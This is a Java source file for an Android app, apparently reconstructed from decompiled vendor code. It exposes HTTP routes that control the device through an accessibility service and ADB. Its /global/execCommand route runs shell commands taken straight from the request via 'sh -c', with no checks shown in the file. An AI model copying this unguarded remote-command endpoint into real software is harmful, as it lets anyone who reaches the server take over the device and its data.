package com.guard.wallet.server.handler;

import com.guard.wallet.adb.AdbConnectionManager;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import com.guard.wallet.core.AppUtils;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.req.RequestCommand;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AccessibilityUtils;
import com.guard.wallet.utils.GlobalActionExecutor;

/**
 * 全局动作 Handler — 12 路由。
 * vendor server/b.java 中 /global/* 路由。
 */
public final class GlobalActionHandler {
    private static final String TAG = "HttpServer";

    private GlobalActionHandler() {}

    // ─── /global/action → vendor f1(GlobalActionCondition, k) ───

    /** vendor f1 — 执行全局动作, actionName 不能为空 */
    public static void action(GlobalActionCondition cond, AsyncHttpServerResponse response) {
        try {
            if (cond == null || AppUtils.B(cond.getActionName())) {
                HttpResponseHelper.error(response, "actionName不能为空");
                return;
            }
            if (!GlobalActionExecutor.executeGlobalAction(cond)) {
                // vendor: F2(response, "参数有误") — code 601 Server Exception
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            HttpResponseHelper.ok(response, Boolean.TRUE);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/execCommand → vendor G(RequestCommand, k) ───

    /** vendor G — 执行 shell 命令, 返回 CommandResult */
    public static void execCommand(RequestCommand cmd, AsyncHttpServerResponse response) {
        try {
            if (cmd == null || cmd.getCommands() == null || cmd.getCommands().isEmpty()) {
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            // vendor: AppUtils.u(commands, false, true) 返回 CommandResult
            String[] commands = new String[cmd.getCommands().size()];
            cmd.getCommands().toArray(commands);
            // 简化执行: 拼接命令执行
            StringBuilder output = new StringBuilder();
            int exitCode = -1;
            for (String command : commands) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                    exitCode = p.waitFor();
                    java.io.InputStream is = p.getInputStream();
                    byte[] buf = new byte[4096];
                    int len;
                    while ((len = is.read(buf)) > 0) {
                        output.append(new String(buf, 0, len));
                    }
                } catch (Exception ex) {
                    Log.e(TAG, "exec fail: " + command, ex);
                }
            }
            java.util.HashMap<String, Object> result = new java.util.HashMap<>();
            result.put("result", exitCode);
            result.put("successMsg", output.toString());
            result.put("errorMsg", "");
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/setText → vendor k1(k, String) ───

    /** vendor k1 — 设置文本, text 不能为空 */
    public static void setText(AsyncHttpServerResponse response, String text) {
        try {
            if (AppUtils.B(text)) {
                HttpResponseHelper.error(response, "text不能为空");
                return;
            }
            if (MyAccessibilityService.P() == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            com.guard.wallet.entity.UiObject focused = MyAccessibilityService.P().J();
            boolean result = false;
            if (focused != null) {
                result = focused.setText(text);
            }
            // vendor: 如果失败且 RatHat 运行中, fallback 到 "input text"
            // if (!result && e.S() != null && e.S().D()) {
            //     result = e.S().N("input text " + text);
            // }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/copy ───

    public static void copy(AsyncHttpServerResponse response, String text) {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            // vendor: 使用 ClipboardManager 复制文本
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    svc.getSystemService(android.content.Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(android.content.ClipData.newPlainText("text", text));
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/paste ───

    public static void paste(AsyncHttpServerResponse response) {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            com.guard.wallet.entity.UiObject focused = svc.J();
            if (focused != null) {
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_PASTE);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/delete ───

    public static void delete(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "delete");
            boolean result = false;
            // vendor: 先尝试通过 ADB input keyevent 删除
            if (AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D()) {
                AdbConnectionManager.getInstance().executeShellCommand("input keyevent KEYCODE_MOVE_END");
                result = AdbConnectionManager.getInstance().executeShellCommand("input keyevent KEYCODE_DEL");
            }
            // vendor: 如果 ADB 方式失败，回退到无障碍方式：截取文本去掉最后一个字符
            if (!result && MyAccessibilityService.P() != null) {
                com.guard.wallet.entity.UiObject focused = MyAccessibilityService.P().J();
                if (focused != null) {
                    String text = focused.text();
                    if (!AppUtils.B(text)) {
                        text = text.substring(0, text.length() - 1);
                    }
                    result = focused.setText(text);
                }
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/clear ───

    public static void clear(AsyncHttpServerResponse response) {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            com.guard.wallet.entity.UiObject focused = svc.J();
            if (focused != null) {
                // vendor: select all + cut
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SELECT);
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CUT);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/lockScreen ───

    public static void lockScreen(AsyncHttpServerResponse response) {
        try {
            // GLOBAL_ACTION_LOCK_SCREEN = 8, requires API 28+
            boolean result = false;
            if (Build.VERSION.SDK_INT >= 28) {
                result = AccessibilityUtils.performGlobalAction(8);
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/wakeUpScreen ───

    public static void wakeUpScreen(AsyncHttpServerResponse response) {
        try {
            // vendor: com.guard.wallet.utils.DeviceUtils.isVivoFamily() — wake screen
            boolean result = com.guard.wallet.utils.DeviceUtils.isVivoFamily();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/keepScreenOn ───

    public static void keepScreenOn(AsyncHttpServerResponse response, boolean keep) {
        try {
            Log.d(TAG, "keepScreenOn: " + keep);
            // vendor: 通过 ADB 执行 svc power stayon 命令
            boolean result = false;
            if (AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().D()) {
                result = AdbConnectionManager.getInstance().executeShellCommand(keep ? "svc power stayon true" : "svc power stayon false");
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/moveHome ───

    public static void moveHome(AsyncHttpServerResponse response) {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            com.guard.wallet.entity.UiObject focused = svc.J();
            if (focused != null) {
                // vendor: 设置光标到开始位置
                android.os.Bundle args = new android.os.Bundle();
                args.putInt(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT,
                        android.view.accessibility.AccessibilityNodeInfo.MOVEMENT_GRANULARITY_PAGE);
                args.putBoolean(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_EXTEND_SELECTION_BOOLEAN, false);
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY, args);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /global/moveEnd ───

    public static void moveEnd(AsyncHttpServerResponse response) {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) {
                HttpResponseHelper.accessibilityNotRunning(response);
                return;
            }
            com.guard.wallet.entity.UiObject focused = svc.J();
            if (focused != null) {
                // vendor: 设置光标到末尾位置
                android.os.Bundle args = new android.os.Bundle();
                args.putInt(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT,
                        android.view.accessibility.AccessibilityNodeInfo.MOVEMENT_GRANULARITY_PAGE);
                args.putBoolean(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_EXTEND_SELECTION_BOOLEAN, false);
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_NEXT_AT_MOVEMENT_GRANULARITY, args);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }
}
